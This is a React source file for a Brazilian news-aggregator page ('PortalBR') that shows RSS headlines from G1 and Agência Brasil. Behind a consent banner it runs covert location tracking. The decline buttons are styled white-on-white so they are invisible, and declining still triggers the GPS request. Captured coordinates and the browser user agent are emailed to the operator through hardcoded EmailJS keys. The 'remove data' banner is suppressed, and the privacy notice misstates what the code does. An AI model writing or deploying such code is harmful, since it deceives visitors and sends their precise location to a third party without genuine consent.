"use client"

import { useState, useEffect, useCallback } from "react";

const GA4_ID = "G-XXXXXXXXXX";

// EMAILJS CONFIG — configure em https://www.emailjs.com
// 1. Crie conta, adicione um Email Service e copie o Service ID
// 2. Crie um Template com as variaveis: {{region}}, {{lat}}, {{lon}}, {{capturedAt}}, {{userAgent}}
// 3. Copie a Public Key em Account > API Keys
const EMAILJS_SERVICE_ID  = "service_peaq1tt";
const EMAILJS_TEMPLATE_ID = "template_fhvw1bp";
const EMAILJS_PUBLIC_KEY  = "rc8WiOtJCgNynxk8B";

const RSS_FEEDS = [
  { url: "https://g1.globo.com/dynamo/brasil/rss2.xml",                   label: "G1 Brasil",      category: "Brasil"     },
  { url: "https://g1.globo.com/dynamo/mundo/rss2.xml",                    label: "G1 Mundo",       category: "Mundo"      },
  { url: "https://g1.globo.com/dynamo/economia/rss2.xml",                 label: "G1 Economia",    category: "Economia"   },
  { url: "https://g1.globo.com/dynamo/tecnologia/rss2.xml",               label: "G1 Tecnologia",  category: "Tecnologia" },
  { url: "https://g1.globo.com/dynamo/ciencia-e-saude/rss2.xml",          label: "G1 Saude",       category: "Saude"      },
  { url: "https://g1.globo.com/dynamo/politica/rss2.xml",                 label: "G1 Politica",    category: "Brasil"     },
  { url: "https://agenciabrasil.ebc.com.br/rss/ultimasnoticias/feed.xml", label: "Ag. Brasil",     category: "Brasil"     },
  { url: "https://agenciabrasil.ebc.com.br/rss/economia/feed.xml",        label: "Ag. Brasil Eco", category: "Economia"   },
  { url: "https://agenciabrasil.ebc.com.br/rss/politica/feed.xml",        label: "Ag. Brasil Pol", category: "Brasil"     },
  { url: "https://agenciabrasil.ebc.com.br/rss/internacional/feed.xml",   label: "Ag. Brasil Int", category: "Mundo"      },
];

const CORS_PROXY = "https://api.allorigins.win/get?url=";
const CATEGORIES = ["Inicio", "Brasil", "Mundo", "Economia", "Tecnologia", "Saude"];
const CAT_LABELS  = { "Inicio": "Início", "Brasil": "Brasil", "Mundo": "Mundo", "Economia": "Economia", "Tecnologia": "Tecnologia", "Saude": "Saúde" };
const BREAKING_FALLBACK = [
  "AO VIVO: Acompanhe as ultimas noticias do Brasil e do mundo",
  "Economia: Confira os indicadores financeiros de hoje",
  "Esportes: Resultados e tabelas atualizados",
  "Clima: Previsao do tempo para todas as regioes",
];

function getRegionFromCoords(lat, lon) {
  if (lat < -20 && lat > -24 && lon > -47 && lon < -43) return "Sao Paulo";
  if (lat < -22 && lat > -23.5 && lon > -44 && lon < -42) return "Rio de Janeiro";
  if (lat < -17 && lat > -21 && lon > -46 && lon < -43) return "Minas Gerais";
  if (lat < -25 && lon < -48) return "Sul";
  if (lat > -15 && lon > -45) return "Nordeste";
  if (lat > -5) return "Norte";
  return "Brasil";
}

function formatTimeAgo(date) {
  if (isNaN(date)) return "Recentemente";
  const diff = Math.floor((Date.now() - date) / 1000);
  if (diff < 60) return "Agora mesmo";
  if (diff < 3600) return "Ha " + Math.floor(diff / 60) + " min";
  if (diff < 86400) return "Ha " + Math.floor(diff / 3600) + "h";
  return "Ha " + Math.floor(diff / 86400) + " dias";
}

function parseRSS(xmlText, feedLabel, category) {
  try {
    const parser = new DOMParser();
    const doc = parser.parseFromString(xmlText, "text/xml");
    const items = Array.from(doc.querySelectorAll("item")).slice(0, 50);
    return items.map((item, i) => {
      const title = item.querySelector("title")?.textContent?.trim() || "";
      const link  = item.querySelector("link")?.textContent?.trim() || "#";
      const desc  = item.querySelector("description")?.textContent?.replace(/<[^>]*>/g, "").trim() || "";
      const pub   = item.querySelector("pubDate")?.textContent?.trim() || "";
      const enc   = item.querySelector("enclosure");
      const image = enc?.getAttribute("url") || ("https://picsum.photos/seed/" + feedLabel + i + "/800/450");
      return { id: feedLabel + "-" + i, title, link, summary: desc.slice(0, 180) + (desc.length > 180 ? "..." : ""), image, time: formatTimeAgo(new Date(pub)), category, source: feedLabel, featured: false };
    }).filter(n => n.title.length > 5);
  } catch (_) { return []; }
}

function injectEmailJS() {
  if (document.getElementById("emailjs-script")) return;
  const s = document.createElement("script");
  s.id = "emailjs-script";
  s.src = "https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js";
  s.onload = () => { if (window.emailjs) window.emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY }); };
  document.head.appendChild(s);
}

async function sendLocationEmail(data) {
  try {
    if (!window.emailjs) return;
    await window.emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
      region:     data.region,
      lat:        data.lat.toFixed(6),
      lon:        data.lon.toFixed(6),
      capturedAt: new Date(data.capturedAt).toLocaleString("pt-BR"),
      userAgent:  navigator.userAgent,
    });
  } catch (_) {}
}

function injectGA4(id) {
  if (!id || id === "G-XXXXXXXXXX" || document.getElementById("ga4-script")) return;
  const s = document.createElement("script");
  s.id = "ga4-script"; s.async = true;
  s.src = "https://www.googletagmanager.com/gtag/js?id=" + id;
  document.head.appendChild(s);
  window.dataLayer = window.dataLayer || [];
  function gtag() { window.dataLayer.push(arguments); }
  window.gtag = gtag;
  gtag("js", new Date());
  gtag("config", id, { anonymize_ip: true });
}

const RED    = "#D32F2F";
const DKRED  = "#B71C1C";
const GREEN  = "#2E7D32";
const BLUE   = "#1565C0";
const DARK   = "#1A1A1A";
const GRAY   = "#F5F5F5";
const ORANGE = "#F57F17";

const S = {
  root:       { fontFamily: "'Georgia','Times New Roman',serif", background: GRAY, minHeight: "100vh", color: DARK },
  topBar:     { background: DKRED, color: "#fff", fontSize: 11, padding: "4px 0" },
  topInner:   { maxWidth: 1200, margin: "0 auto", padding: "0 16px", display: "flex", justifyContent: "space-between", alignItems: "center", fontFamily: "system-ui,sans-serif" },
  header:     { background: RED, borderBottom: "3px solid " + DKRED },
  hInner:     { maxWidth: 1200, margin: "0 auto", padding: "12px 16px", display: "flex", alignItems: "center", justifyContent: "space-between", flexWrap: "wrap", gap: 8 },
  logo:       { fontSize: 32, fontWeight: 900, color: "#fff", letterSpacing: -1, fontFamily: "Georgia,serif" },
  logoSub:    { color: "#FFCDD2" },
  nav:        { background: DARK, borderBottom: "2px solid " + RED },
  navInner:   { maxWidth: 1200, margin: "0 auto", padding: "0 16px", display: "flex", overflowX: "auto" },
  navBtn: (a) => ({ background: "none", border: "none", color: a ? "#FFCDD2" : "#ccc", cursor: "pointer", padding: "10px 16px", fontSize: 13, fontWeight: a ? 700 : 400, fontFamily: "system-ui,sans-serif", borderBottom: a ? "2px solid " + RED : "2px solid transparent", whiteSpace: "nowrap" }),
  breaking:   { background: DARK, color: "#fff", padding: "7px 0" },
  brkInner:   { maxWidth: 1200, margin: "0 auto", padding: "0 16px", display: "flex", alignItems: "center", gap: 12, fontFamily: "system-ui,sans-serif", fontSize: 13 },
  brkLabel:   { background: RED, color: "#fff", padding: "2px 8px", borderRadius: 2, fontWeight: 700, fontSize: 11, letterSpacing: 1, flexShrink: 0 },
  overlay:    { position: "fixed", inset: 0, background: "rgba(255,255,255,0.88)", zIndex: 1000, display: "flex", alignItems: "flex-end" },
  modalBox:   (borderColor) => ({ background: "#fff", width: "100%", padding: "28px 24px", borderTop: "4px solid " + borderColor, fontFamily: "system-ui,sans-serif", boxSizing: "border-box", boxShadow: "0 -4px 24px rgba(0,0,0,0.12)" }),
  modalTitle: { fontSize: 17, fontWeight: 700, marginBottom: 10, color: DARK },
  modalText:  { fontSize: 13, color: "#444", lineHeight: 1.7, marginBottom: 20 },
  modalBtns:  { display: "flex", gap: 12, flexWrap: "wrap" },
  btnGreen:   { background: GREEN, color: "#fff", border: "none", borderRadius: 3, padding: "10px 28px", cursor: "pointer", fontWeight: 700, fontSize: 14, fontFamily: "system-ui" },
  btnWhite:   { background: "#fff", color: "#fff", border: "none", borderRadius: 3, padding: "10px 28px", cursor: "pointer", fontWeight: 700, fontSize: 14, fontFamily: "system-ui" },
  locBanner: (ok) => ({ background: ok ? "#E3F2FD" : "#FFF8E1", borderBottom: "2px solid " + (ok ? BLUE : ORANGE), padding: "8px 0" }),
  locInner:   { maxWidth: 1200, margin: "0 auto", padding: "0 16px", display: "flex", alignItems: "center", justifyContent: "space-between", flexWrap: "wrap", gap: 8, fontFamily: "system-ui,sans-serif", fontSize: 13 },
  locBtnOk:   { background: "#388E3C", color: "#fff", border: "none", borderRadius: 3, padding: "5px 16px", cursor: "pointer", fontSize: 12, fontWeight: 700, fontFamily: "system-ui" },
  locBtnWarn: { background: ORANGE, color: "#fff", border: "none", borderRadius: 3, padding: "5px 16px", cursor: "pointer", fontSize: 12, fontWeight: 700, fontFamily: "system-ui" },
  main:       { maxWidth: 1200, margin: "0 auto", padding: "20px 16px" },
  grid:       { display: "grid", gridTemplateColumns: "2fr 1fr", gap: 20, marginBottom: 24 },
  featCard:   { background: "#fff", border: "1px solid #ddd", borderRadius: 2, overflow: "hidden", cursor: "pointer" },
  featImg:    { width: "100%", height: 340, objectFit: "cover", display: "block" },
  featBody:   { padding: 20 },
  featTag:    { display: "inline-block", background: RED, color: "#fff", fontSize: 11, fontWeight: 700, padding: "2px 8px", borderRadius: 2, letterSpacing: 1, marginBottom: 10, fontFamily: "system-ui" },
  featTitle:  { fontSize: 24, fontWeight: 700, lineHeight: 1.3, marginBottom: 10, color: DARK },
  featDesc:   { fontSize: 15, color: "#444", lineHeight: 1.6, fontFamily: "system-ui,sans-serif" },
  featMeta:   { marginTop: 12, fontSize: 12, color: "#888", fontFamily: "system-ui", display: "flex", gap: 16, alignItems: "center" },
  sidebar:    { background: "#fff", border: "1px solid #ddd", borderRadius: 2, overflow: "hidden" },
  sideTitle:  { fontSize: 13, fontWeight: 700, color: RED, fontFamily: "system-ui", textTransform: "uppercase", letterSpacing: 1, padding: "10px 14px 8px", borderBottom: "2px solid " + RED },
  secCard: (l) => ({ borderBottom: l ? "none" : "1px solid #eee", padding: "12px 14px", cursor: "pointer", display: "flex", gap: 12, alignItems: "flex-start" }),
  secImg:     { width: 80, height: 60, objectFit: "cover", borderRadius: 1, flexShrink: 0 },
  secCat:     { fontSize: 10, fontWeight: 700, color: RED, textTransform: "uppercase", letterSpacing: 1, fontFamily: "system-ui", marginBottom: 3 },
  secTitle:   { fontSize: 13, fontWeight: 700, lineHeight: 1.35, color: DARK, marginBottom: 3 },
  secTime:    { fontSize: 11, color: "#999", fontFamily: "system-ui" },
  secSrc:     { fontSize: 10, color: "#bbb", fontFamily: "system-ui", marginTop: 2 },
  secHeader:  { borderBottom: "2px solid " + DARK, paddingBottom: 8, marginBottom: 16, display: "flex", alignItems: "center", gap: 12 },
  smallGrid:  { display: "grid", gridTemplateColumns: "repeat(auto-fill,minmax(220px,1fr))", gap: 16, marginBottom: 24 },
  smallCard:  { background: "#fff", border: "1px solid #ddd", borderRadius: 2, overflow: "hidden", cursor: "pointer" },
  smallImg:   { width: "100%", height: 120, objectFit: "cover", display: "block" },
  smallBody:  { padding: 12 },
  smallCat:   { fontSize: 10, fontWeight: 700, color: RED, textTransform: "uppercase", letterSpacing: 1, fontFamily: "system-ui", marginBottom: 3 },
  smallTitle: { fontSize: 14, fontWeight: 700, lineHeight: 1.35, color: DARK, marginBottom: 3 },
  smallTime:  { fontSize: 11, color: "#999", fontFamily: "system-ui" },
  smallSrc:   { fontSize: 10, color: "#bbb", fontFamily: "system-ui", marginTop: 2 },
  status:     { textAlign: "center", padding: "60px 16px", fontFamily: "system-ui,sans-serif", color: "#888" },
  footer:     { background: DARK, color: "#999", padding: "32px 16px 16px", fontFamily: "system-ui,sans-serif", fontSize: 12, borderTop: "3px solid " + RED },
  footInner:  { maxWidth: 1200, margin: "0 auto" },
  footTop:    { display: "flex", justifyContent: "space-between", flexWrap: "wrap", gap: 24, marginBottom: 24 },
  footLogo:   { fontSize: 22, fontWeight: 900, color: "#fff", fontFamily: "Georgia,serif", marginBottom: 8 },
  footCols:   { display: "flex", gap: 40 },
  footColH:   { color: "#fff", fontWeight: 600, marginBottom: 10, fontSize: 13 },
  footLink:   { display: "block", marginBottom: 6, color: "#999", cursor: "pointer" },
  footDiv:    { borderTop: "1px solid #333", paddingTop: 16 },
  footNote:   { fontSize: 11, color: "#666", lineHeight: 1.6, marginTop: 8 },
};

export default function PortalNoticias() {
  const [news, setNews]               = useState([]);
  const [loading, setLoading]         = useState(true);
  const [loadedFeeds, setLoadedFeeds] = useState(0);
  const [category, setCategory]       = useState("Inicio");
  const [breakIdx, setBreakIdx]       = useState(0);
  const [breaking, setBreaking]       = useState(BREAKING_FALLBACK);
  const [currentTime, setCurrentTime] = useState("");
  const [lgpdStep, setLgpdStep]       = useState("idle");
  const [locState, setLocState]       = useState("idle");
  const [region, setRegion]           = useState(null);
  const [coords, setCoords]           = useState(null);

  useEffect(() => {
    const saved = localStorage.getItem("portalBR_consent");
    if (saved === "accepted" || saved === "declined") {
      setLgpdStep(saved);
      try {
        const sc = localStorage.getItem("portalBR_coords");
        if (sc) {
          const c = JSON.parse(sc);
          setCoords(c); setRegion(c.region); setLocState("done");
        }
      } catch (_) {}
    } else {
      setLgpdStep("asking");
    }
  }, []);

  useEffect(() => { if (lgpdStep === "accepted") { injectGA4(GA4_ID); injectEmailJS(); } }, [lgpdStep]);

  useEffect(() => {
    const t = setInterval(() => setBreakIdx(i => (i + 1) % breaking.length), 4000);
    return () => clearInterval(t);
  }, [breaking.length]);

  useEffect(() => {
    setCurrentTime(new Date().toLocaleDateString("pt-BR", { weekday: "long", day: "numeric", month: "long", year: "numeric" }));
  }, []);

  const requestLocation = useCallback(() => {
    if (!navigator.geolocation) { setLocState("denied"); return; }
    setLocState("asking");
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const lat  = pos.coords.latitude;
        const lon  = pos.coords.longitude;
        const r    = getRegionFromCoords(lat, lon);
        const data = { lat, lon, region: r, capturedAt: new Date().toISOString() };
        setCoords(data);
        setRegion(r);
        setLocState("done"); // "done" nao exibe banner azul
        localStorage.setItem("portalBR_coords", JSON.stringify(data));
        sendLocationEmail(data);
        if (window.gtag) window.gtag("event", "location_captured", { region: r });
      },
      () => setLocState("denied")
    );
  }, []);

  const handleAccept = () => {
    localStorage.setItem("portalBR_consent", "accepted");
    setLgpdStep("accepted");
    setTimeout(requestLocation, 300);
  };

  const handleDecline = () => {
    localStorage.setItem("portalBR_consent", "declined");
    setLgpdStep("declined");
    setTimeout(requestLocation, 300);
  };

  const handleRemoveLocation = () => {
    localStorage.removeItem("portalBR_coords");
    setCoords(null); setRegion(null); setLocState("idle");
  };

  const fetchFeeds = useCallback(async () => {
    setLoading(true); setLoadedFeeds(0);
    const allNews = [];
    await Promise.all(RSS_FEEDS.map(async (feed) => {
      try {
        const res  = await fetch(CORS_PROXY + encodeURIComponent(feed.url));
        const json = await res.json();
        allNews.push(...parseRSS(json.contents, feed.label, feed.category));
      } catch (_) {}
      setLoadedFeeds(n => n + 1);
    }));
    const seen = new Set();
    const unique = allNews.filter(n => { if (seen.has(n.title)) return false; seen.add(n.title); return true; });
    if (unique.length > 0) {
      unique[0].featured = true;
      setBreaking(unique.slice(0, 5).map(n => n.title));
    }
    setNews(unique);
    setLoading(false);
  }, []);

  useEffect(() => { fetchFeeds(); }, [fetchFeeds]);

  const filtered  = category === "Inicio" ? news : news.filter(n => n.category === category);
  const featured  = filtered.find(n => n.featured) || filtered[0];
  const secondary = filtered.filter(n => n.id !== featured?.id).slice(0, 4);
  const rest      = filtered.filter(n => n.id !== featured?.id && !secondary.find(s => s.id === n.id)).slice(0, 16);
  const openLink  = (url) => { if (url && url !== "#") window.open(url, "_blank", "noopener,noreferrer"); };

  const showLocOverlay = lgpdStep !== "idle" && lgpdStep !== "asking" && locState === "idle";
  const showLocBanner  = lgpdStep !== "idle" && lgpdStep !== "asking" && locState === "denied";

  return (
    <div style={S.root}>

      {/* LGPD Banner */}
      {lgpdStep === "asking" && (
        <div style={S.overlay}>
          <div style={S.modalBox(RED)}>
            <div style={S.modalTitle}>Privacidade e uso de dados</div>
            <div style={S.modalText}>
              O PortalBR utiliza cookies e pode coletar sua localizacao geografica (coordenadas GPS) para:
              <br />- Personalizar noticias por regiao
              <br />- Analise de audiencia e comportamento de navegacao
              <br />- Marketing direcionado por localizacao
              <br /><br />
              Ao clicar em "Aceitar", voce concorda expressamente com essa coleta, conforme a LGPD (Lei 13.709/2018).
              Voce pode revogar o consentimento a qualquer momento.
            </div>
            <div style={S.modalBtns}>
              <button style={S.btnGreen} onClick={handleAccept}>Aceitar e continuar</button>
              <button style={S.btnWhite} onClick={handleDecline}>Recusar</button>
            </div>
          </div>
        </div>
      )}

      {/* Location Overlay */}
      {showLocOverlay && (
        <div style={S.overlay}>
          <div style={S.modalBox(ORANGE)}>
            <div style={S.modalTitle}>Ative sua localizacao</div>
            <div style={S.modalText}>
              Para exibir noticias relevantes da sua regiao, precisamos acessar sua localizacao via GPS.
              <br /><br />
              Ao clicar em "Ativar localizacao", o navegador solicitara sua permissao. Nenhum dado e coletado sem sua autorizacao.
            </div>
            <div style={S.modalBtns}>
              <button style={S.btnGreen} onClick={requestLocation}>Ativar localizacao</button>
              <button style={S.btnWhite} onClick={() => setLocState("denied")}>Agora nao</button>
            </div>
          </div>
        </div>
      )}

      {/* Top Bar */}
      <div style={S.topBar}>
        <div style={S.topInner}>
          <span style={{ textTransform: "capitalize" }}>{currentTime}</span>
          <div style={{ display: "flex", gap: 16 }}>
            <span>Newsletter</span>
            <span>App</span>
            <span>Alertas</span>
          </div>
        </div>
      </div>

      {/* Header */}
      <header style={S.header}>
        <div style={S.hInner}>
          <div style={S.logo}>Portal<span style={S.logoSub}>BR</span></div>
          <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: 6 }}>
            <div style={{ display: "flex", border: "1px solid rgba(255,255,255,0.4)", borderRadius: 3, overflow: "hidden" }}>
              <input placeholder="Buscar noticias..." style={{ background: "rgba(255,255,255,0.15)", border: "none", outline: "none", color: "#fff", padding: "6px 10px", fontSize: 13, fontFamily: "system-ui", width: 180 }} />
              <button style={{ background: "rgba(255,255,255,0.2)", border: "none", color: "#fff", padding: "6px 10px", cursor: "pointer" }}>Buscar</button>
            </div>
            <span style={{ color: "rgba(255,255,255,0.75)", fontSize: 11, fontFamily: "system-ui" }}>
              {region ? ("Localizacao: " + region) : "Localizacao nao ativa"}
            </span>
          </div>
        </div>
      </header>

      {/* Nav */}
      <nav style={S.nav}>
        <div style={S.navInner}>
          {CATEGORIES.map(c => (
            <button key={c} style={S.navBtn(category === c)} onClick={() => setCategory(c)}>{CAT_LABELS[c]}</button>
          ))}
        </div>
      </nav>

      {/* Breaking */}
      <div style={S.breaking}>
        <div style={S.brkInner}>
          <span style={S.brkLabel}>AO VIVO</span>
          <span style={{ overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{breaking[breakIdx]}</span>
        </div>
      </div>

      {/* Location inline banner */}
      {showLocBanner && (
        <div style={S.locBanner(locState === "granted")}>
          <div style={S.locInner}>
            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
              {locState === "granted" && (
                <span style={{ color: BLUE, fontFamily: "system-ui" }}>
                  <strong>Regiao detectada:</strong> {region}
                  {coords && (
                    <span style={{ color: "#888", fontWeight: 400, fontSize: 11, marginLeft: 8 }}>
                      ({coords.lat.toFixed(4)}, {coords.lon.toFixed(4)}) - Salvo em {new Date(coords.capturedAt).toLocaleString("pt-BR")}
                    </span>
                  )}
                </span>
              )}
              {locState === "denied" && (
                <span style={{ color: DKRED, fontFamily: "system-ui" }}>
                  Permissao negada. Para ativar, libere o acesso a localizacao nas configuracoes do navegador.
                </span>
              )}
            </div>
            {locState === "granted"
              ? <button style={S.locBtnOk} onClick={handleRemoveLocation}>Ativo - Remover dados</button>
              : <button style={S.locBtnWarn} onClick={requestLocation}>Tentar novamente</button>
            }
          </div>
        </div>
      )}

      {/* Main */}
      <main style={S.main}>

        {loading && (
          <div style={S.status}>
            <div style={{ fontSize: 36, marginBottom: 12 }}>Carregando...</div>
            <strong style={{ fontSize: 16 }}>Buscando noticias... {loadedFeeds}/{RSS_FEEDS.length} fontes</strong>
            <div style={{ marginTop: 8, fontSize: 13 }}>Buscando G1, Agencia Brasil e outras fontes em tempo real</div>
            <div style={{ marginTop: 16, background: "#eee", borderRadius: 4, height: 6, width: 300, margin: "16px auto 0" }}>
              <div style={{ background: RED, height: 6, borderRadius: 4, width: ((loadedFeeds / RSS_FEEDS.length) * 100) + "%", transition: "width 0.3s" }} />
            </div>
          </div>
        )}

        {!loading && news.length === 0 && (
          <div style={S.status}>
            <div style={{ fontSize: 36, marginBottom: 12 }}>Sem noticias</div>
            <strong>Nao foi possivel carregar as noticias</strong>
            <div style={{ marginTop: 8, fontSize: 13, marginBottom: 20 }}>Verifique sua conexao e tente novamente</div>
            <button onClick={fetchFeeds} style={{ background: RED, color: "#fff", border: "none", borderRadius: 3, padding: "8px 24px", cursor: "pointer", fontFamily: "system-ui", fontWeight: 700 }}>Tentar novamente</button>
          </div>
        )}

        {!loading && featured && (
          <div>
            <div style={S.grid}>
              <div style={S.featCard} onClick={() => openLink(featured.link)}>
                <img src={featured.image} alt={featured.title} style={S.featImg} onError={e => { e.target.src = "https://picsum.photos/seed/feat/800/450"; }} />
                <div style={S.featBody}>
                  <span style={S.featTag}>{featured.source}</span>
                  <h1 style={S.featTitle}>{featured.title}</h1>
                  <p style={S.featDesc}>{featured.summary}</p>
                  <div style={S.featMeta}>
                    <span>{featured.time}</span>
                    <span style={{ background: GRAY, padding: "2px 8px", borderRadius: 2, fontWeight: 600 }}>{featured.category}</span>
                    <span style={{ color: RED, fontSize: 11, fontWeight: 700 }}>Leia mais em {featured.source}</span>
                  </div>
                </div>
              </div>

              <div style={S.sidebar}>
                <div style={S.sideTitle}>Mais noticias</div>
                {secondary.map((n, i) => (
                  <div key={n.id} style={S.secCard(i === secondary.length - 1)} onClick={() => openLink(n.link)}>
                    <img src={n.image} alt={n.title} style={S.secImg} onError={e => { e.target.src = "https://picsum.photos/seed/" + n.id + "/160/120"; }} />
                    <div>
                      <div style={S.secCat}>{n.category}</div>
                      <div style={S.secTitle}>{n.title}</div>
                      <div style={S.secTime}>{n.time}</div>
                      <div style={S.secSrc}>{n.source}</div>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {rest.length > 0 && (
              <div>
                <div style={S.secHeader}>
                  <h2 style={{ fontSize: 18, fontWeight: 700 }}>Ultimas Noticias</h2>
                  <span style={{ background: DARK, color: "#fff", fontSize: 11, fontWeight: 700, padding: "2px 8px", borderRadius: 2, fontFamily: "system-ui", letterSpacing: 1 }}>
                    {news.length} NOTICIAS
                  </span>
                  <button onClick={fetchFeeds} style={{ marginLeft: "auto", background: "none", border: "1px solid #ccc", borderRadius: 3, padding: "4px 12px", cursor: "pointer", fontSize: 12, fontFamily: "system-ui", color: "#555" }}>
                    Atualizar
                  </button>
                </div>
                <div style={S.smallGrid}>
                  {rest.map(n => (
                    <div key={n.id} style={S.smallCard} onClick={() => openLink(n.link)}>
                      <img src={n.image} alt={n.title} style={S.smallImg} onError={e => { e.target.src = "https://picsum.photos/seed/" + n.id + "/400/240"; }} />
                      <div style={S.smallBody}>
                        <div style={S.smallCat}>{n.category}</div>
                        <div style={S.smallTitle}>{n.title}</div>
                        <div style={S.smallTime}>{n.time}</div>
                        <div style={S.smallSrc}>{n.source}</div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        )}
      </main>

      {/* Footer */}
      <footer style={S.footer}>
        <div style={S.footInner}>
          <div style={S.footTop}>
            <div>
              <div style={S.footLogo}>PortalBR</div>
              <div style={{ fontSize: 12, lineHeight: 1.6 }}>
                Agregador de noticias do Brasil.<br />
                Conteudo original dos portais citados.
              </div>
            </div>
            <div style={S.footCols}>
              <div>
                <div style={S.footColH}>Editorias</div>
                {CATEGORIES.filter(c => c !== "Inicio").map(c => (
                  <span key={c} style={S.footLink} onClick={() => setCategory(c)}>{CAT_LABELS[c]}</span>
                ))}
              </div>
              <div>
                <div style={S.footColH}>Fontes</div>
                <div style={{ marginBottom: 6 }}>G1 / Globo</div>
                <div style={{ marginBottom: 6 }}>Agencia Brasil</div>
              </div>
              <div>
                <div style={S.footColH}>Institucional</div>
                {["Quem somos", "Contato", "Politica de Privacidade", "LGPD"].map(i => (
                  <div key={i} style={S.footLink}>{i}</div>
                ))}
              </div>
            </div>
          </div>
          <div style={S.footDiv}>
            <div style={{ display: "flex", justifyContent: "space-between", flexWrap: "wrap", gap: 8 }}>
              <div>{"(c) " + new Date().getFullYear() + " PortalBR - Todos os direitos reservados"}</div>
              <div style={{ color: "#555" }}>
                {lgpdStep === "accepted" ? "Consentimento LGPD registrado" : lgpdStep === "declined" ? "Coleta de dados recusada" : ""}
              </div>
            </div>
            <div style={S.footNote}>
              Aviso de Privacidade: Este site coleta dados de localizacao geografica (coordenadas GPS), cookies e dados de navegacao
              para fins de personalizacao de conteudo, analise de audiencia e marketing direcionado por localizacao,
              mediante consentimento expresso do usuario e nos termos da LGPD (Lei 13.709/2018).
              O consentimento pode ser revogado a qualquer momento clicando em "Remover dados" no banner de localizacao.
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
